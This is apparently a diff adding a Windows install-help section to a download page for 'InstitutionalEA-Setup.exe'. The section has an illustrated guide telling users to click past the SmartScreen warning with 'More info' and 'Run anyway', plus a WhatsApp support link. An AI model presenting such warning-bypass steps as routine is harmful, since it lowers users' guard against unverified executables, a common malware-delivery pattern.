@@ -255,6 +255,93 @@
             </a>
           </div>
 
+          <p class="win-smartscreen-note" data-smartscreen-help>
+            <svg class="win-smartscreen-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.1" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+            <span>
+              Windows warning? Click <strong>More info</strong>, then <strong>Run anyway</strong>.
+              <a href="#windows-install-help" class="win-smartscreen-link" data-open-win-help>See steps</a>
+            </span>
+          </p>
+
+          <details class="win-help-details" id="windows-install-help" data-smartscreen-help>
+            <summary class="win-help-summary">
+              <span>Windows shows a warning? Install in 4 steps</span>
+              <svg class="win-help-chevron" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+                <polyline points="6 9 12 15 18 9"></polyline>
+              </svg>
+            </summary>
+            <div class="win-help-body">
+              <ol class="win-help-steps">
+                <li>Download <code>InstitutionalEA-Setup.exe</code> from arcadefx.live. If your browser asks, click <strong>Keep</strong>.</li>
+                <li>Open the downloaded file.</li>
+                <li>On the blue &ldquo;Windows protected your PC&rdquo; window, click <strong>More info</strong>.</li>
+                <li>Click <strong>Run anyway</strong>, then <strong>Yes</strong>.</li>
+              </ol>
+
+              <figure class="win-help-illus">
+                <svg class="win-help-svg" viewBox="0 0 460 154" role="img" aria-label="Illustration showing step 1 More info and step 2 Run anyway">
+                  <!-- Panel 1: Before clicking More info -->
+                  <rect x="2" y="2" width="218" height="150" rx="10" class="win-illus-card"/>
+                  <rect x="2" y="2" width="218" height="30" rx="10" class="win-illus-header"/>
+                  <rect x="2" y="22" width="218" height="10" class="win-illus-header"/>
+                  <text x="14" y="21" class="win-illus-title">Windows protected your PC</text>
+                  <rect x="14" y="44" width="164" height="7" rx="3.5" class="win-illus-line"/>
+                  <rect x="14" y="57" width="132" height="7" rx="3.5" class="win-illus-line"/>
+                  <!-- Callout 1: More info -->
+                  <rect x="11" y="72" width="76" height="22" rx="5" class="win-illus-highlight"/>
+                  <text x="16" y="87" class="win-illus-link">More info</text>
+                  <circle cx="80" cy="73" r="9" class="win-illus-badge"/>
+                  <text x="80" y="77" text-anchor="middle" class="win-illus-badge-text">1</text>
+                  <rect x="132" y="114" width="74" height="24" rx="5" class="win-illus-btn-muted"/>
+                  <text x="169" y="130" text-anchor="middle" class="win-illus-btn-muted-text">Don't run</text>
+
+                  <!-- Arrow -->
+                  <path d="M225 77h10m-3-4 4 4-4 4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="win-illus-arrow"/>
+
+                  <!-- Panel 2: After clicking More info -->
+                  <rect x="240" y="2" width="218" height="150" rx="10" class="win-illus-card"/>
+                  <rect x="240" y="2" width="218" height="30" rx="10" class="win-illus-header"/>
+                  <rect x="240" y="22" width="218" height="10" class="win-illus-header"/>
+                  <text x="252" y="21" class="win-illus-title">Windows protected your PC</text>
+                  <rect x="252" y="44" width="150" height="7" rx="3.5" class="win-illus-line"/>
+                  <rect x="252" y="57" width="118" height="7" rx="3.5" class="win-illus-line"/>
+                  <rect x="252" y="74" width="90" height="7" rx="3.5" class="win-illus-line"/>
+                  <!-- Callout 2: Run anyway -->
+                  <rect x="250" y="112" width="90" height="28" rx="6" class="win-illus-highlight"/>
+                  <rect x="253" y="115" width="84" height="22" rx="4" class="win-illus-btn-primary"/>
+                  <text x="295" y="130" text-anchor="middle" class="win-illus-btn-primary-text">Run anyway</text>
+                  <circle cx="337" cy="113" r="9" class="win-illus-badge"/>
+                  <text x="337" y="117" text-anchor="middle" class="win-illus-badge-text">2</text>
+                  <rect x="370" y="115" width="74" height="22" rx="4" class="win-illus-btn-muted"/>
+                  <text x="407" y="130" text-anchor="middle" class="win-illus-btn-muted-text">Don't run</text>
+                </svg>
+                <figcaption class="win-help-illus-caption">Illustration</figcaption>
+              </figure>
+
+              <div class="win-help-footer">
+                <p class="win-help-meta">
+                  Optional: check the file's SHA-256 matches
+                  <a class="win-help-inline-link" data-win-help-sums target="_blank" rel="noopener noreferrer">SHA256SUMS.txt</a>
+                  on this page.
+                </p>
+                <p class="win-help-meta">
+                  Need help?
+                  <a
+                    class="win-help-inline-link"
+                    data-link="whatsapp"
+                    href="https://wa.me/254712052104"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                  >WhatsApp Support</a>
+                </p>
+              </div>
+            </div>
+          </details>
+
           <!-- Android release metadata & copyable SHA-256 verification -->
           <div class="android-meta-bar" id="android-meta-bar" aria-live="polite"></div>
         </div>
